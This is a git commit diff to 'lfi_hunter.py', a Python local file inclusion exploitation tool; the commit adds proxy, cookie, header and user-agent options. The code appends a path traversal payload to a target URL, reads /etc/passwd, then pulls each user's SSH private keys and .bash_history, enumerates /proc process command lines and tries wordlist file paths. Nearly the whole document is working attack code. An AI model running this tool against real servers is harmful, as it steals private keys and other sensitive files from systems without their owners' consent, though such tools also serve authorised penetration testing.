d4d992f305d31d98cca51447024531d64edca8ea
Adrian <hadrian3689@gmail.com>
2022-10-05 01:26:03 -0400

    Added proxy,header,cookie, and user-agent option

--- lfi_hunter.py
+++ lfi_hunter.py
@@ -5,19 +5,50 @@ import signal
 import re
 
 class LFI_Hunter():
-    def __init__(self,url,file,payload,pid,output_file,threads):
+    def __init__(self,url,file,lfi,pid,output_file,threads,header,cookie,user_agent,proxy):
         self.url = url
         self.file = file
-        self.payload = payload
+        self.lfi = lfi
         self.pid = pid
         self.output_file = output_file
         self.check = self.size_check()
         self.threads = threads
+        self.header = header
+        self.cookie = cookie
+        self.user_agent = user_agent
+        self.proxy = proxy
 
+        self.headers,self.proxy_set = self.create_headers()
         self.set_processes_wordlist()
         self.set_processes_procs()
         self.get_history()
         self.get_keys()
+
+    def create_headers(self):
+        headers = {
+            "Connection":"close"
+        }
+
+        proxy_set = {}
+
+        if args.a:
+            headers["User-Agent"] = self.user_agent
+
+        if args.p:
+            proxy_set = {
+                "http": "http://" + self.proxy
+            }
+        
+        if args.c:
+            headers['Cookie'] = self.cookie
+
+        if args.H:
+            header_list = self.header.split(': ')
+            list_length = len(header_list) - 1 
+            for each_header in range(0,list_length):
+                headers[header_list[each_header]] = header_list[each_header + 1]
+
+        return headers,proxy_set
             
     def size_check(self):
         requests.packages.urllib3.disable_warnings()
@@ -25,7 +56,7 @@ class LFI_Hunter():
             file_write = open(self.output_file,"w")
             file_write.close()
 
-        check = self.url + self.payload + "/9fX1SxbT61qUDQKjpDWo8ApV3YTVLpz5ThM3wJ6XOqlaz"
+        check = self.url + self.lfi + "/9fX1SxbT61qUDQKjpDWo8ApV3YTVLpz5ThM3wJ6XOqlaz"
         req_lfi = requests.get(check, allow_redirects = False, verify=False)
         page_size = len(req_lfi.text)
 
@@ -45,14 +76,14 @@ class LFI_Hunter():
 
     def get_keys(self):
         requests.packages.urllib3.disable_warnings()
-        find_users = self.url + self.payload + "/etc/passwd"
+        find_users = self.url + self.lfi + "/etc/passwd"
         req_lfi = requests.get(find_users, allow_redirects = False, verify=False)
         search = re.findall("/home/(.*):/bin/",req_lfi.text)
         
         for each_user in search:
             print("Searching for SSH keys for user(s) " + each_user)
-            ssh_payload = self.url + self.payload + "/home/" + each_user + "/.ssh/id_rsa"
-            req_ssh = requests.get(ssh_payload, allow_redirects = False, verify=False)
+            ssh_payload = self.url + self.lfi + "/home/" + each_user + "/.ssh/id_rsa"
+            req_ssh = requests.get(ssh_payload, headers=self.headers, proxies=self.proxy_set, allow_redirects = False, verify=False)
             
             if len(req_ssh.text) > self.check:
                 line1 = "Found: \x1b[6;30;42mSSH Keys for " + each_user.strip() + "\x1b[0m"
@@ -72,14 +103,14 @@ class LFI_Hunter():
 
     def get_history(self):
         requests.packages.urllib3.disable_warnings()
-        find_users = self.url + self.payload + "/etc/passwd"
+        find_users = self.url + self.lfi + "/etc/passwd"
         req_lfi = requests.get(find_users, allow_redirects = False, verify=False)
         search = re.findall("/home/(.*):/bin/",req_lfi.text)
         
         for each_user in search:
             print("Searching for history files for user(s) " + each_user)
-            ssh_payload = self.url + self.payload + "/home/" + each_user + "/.bash_history"
-            req_ssh = requests.get(ssh_payload, allow_redirects = False, verify=False)
+            ssh_payload = self.url + self.lfi + "/home/" + each_user + "/.bash_history"
+            req_ssh = requests.get(ssh_payload, headers=self.headers, proxies=self.proxy_set, allow_redirects = False, verify=False)
             
             if len(req_ssh.text) > self.check:
                 line1 = "Found: \x1b[6;30;42mHistory File for " + each_user.strip() + "\x1b[0m"
@@ -95,7 +126,7 @@ class LFI_Hunter():
 
             else:
                 print("No history file found for user(s) " + each_user.strip())
-                print("\033[31m" + "*" * 100 + "\x1b[0m") 
+                print("\033[31m" + "*" * 100 + "\x1b[0m")
 
     def set_processes_wordlist(self):
         original_sigint_handler = signal.signal(signal.SIGINT, signal.SIG_IGN)
@@ -135,12 +166,8 @@ class LFI_Hunter():
 
     def get_procs(self,each_pid):
         requests.packages.urllib3.disable_warnings()
-        headers = {
-            "Connection":"close"
-        }
-
-        process = self.url + self.payload + "/proc/" + str(each_pid) + "/cmdline"
-        req_proc = requests.get(process, headers=headers, allow_redirects = False, verify=False)
+        process = self.url + self.lfi + "/proc/" + str(each_pid) + "/cmdline"
+        req_proc = requests.get(process, headers=self.headers, proxies=self.proxy_set, allow_redirects = False, verify=False)
         if len(req_proc.text) > self.check:
             line1 = "Process: \x1b[6;30;42m/proc/" + str(each_pid) + "/cmdline\x1b[0m"
             line2 = "\n" + req_proc.text + "\n"
@@ -153,12 +180,8 @@ class LFI_Hunter():
                 print(line3)
 
     def lfihunt(self,each_line):
-        requests.packages.urllib3.disable_warnings()
-        headers = {
-            "Connection":"close" 
-        }
-        
-        req_lfi = requests.get(self.url + self.payload + each_line, headers=headers, allow_redirects = False, verify=False)
+        requests.packages.urllib3.disable_warnings()  
+        req_lfi = requests.get(self.url + self.lfi + each_line, headers=self.headers, proxies=self.proxy_set, allow_redirects = False, verify=False)
 
         if len(req_lfi.text) > self.check:
             line1 = "File: \x1b[6;30;42m" + each_line + "\x1b[0m"
@@ -175,14 +198,18 @@ if __name__ == "__main__":
     parser = argparse.ArgumentParser(description='LFI Enumeration Tool')
     parser.add_argument('-u', metavar='<url URL>', help='Example: -u http://lfi.location/?parameter=', required=True)
     parser.add_argument('-w', metavar='<Wordlist file>',help="Example: -w unix.txt", required=True)
-    parser.add_argument('-p', metavar='<LFI Payload>',help="Example: -p ../../../../../", required=True)
+    parser.add_argument('-l', metavar='<LFI Payload>',help="Example: -l ../../../../../", required=True)
     parser.add_argument('-pid', metavar='<Set max pid value>',default='1000',help="Default is 1000. Example: -pid 2000", required=False)
     parser.add_argument('-o', metavar='<Output file>',help="Example: -o output.txt", required=False)
     parser.add_argument('-t', metavar='<Threads>',default="10",help="Example: -t 100. Default 10", required=False)
+    parser.add_argument('-H', metavar='<Header>',help="Example -H 'Parameter: Value", required=False)
+    parser.add_argument('-c', metavar='<Cookie>',help="Example -c 'Cookie Value", required=False)
+    parser.add_argument('-a', metavar='<User-Agent>',help="Example: -a Linux", required=False)
+    parser.add_argument('-p', metavar='<Proxies>',help="Example: -p 127.0.0.1:8080", required=False)
     args = parser.parse_args()
     
     try:
-        LFI_Hunter(args.u,args.w,args.p,args.pid,args.o,args.t)
+        LFI_Hunter(args.u,args.w,args.l,args.pid,args.o,args.t,args.H,args.c,args.a,args.p)
     except KeyboardInterrupt:
         print("\nBye Bye!")
         exit()
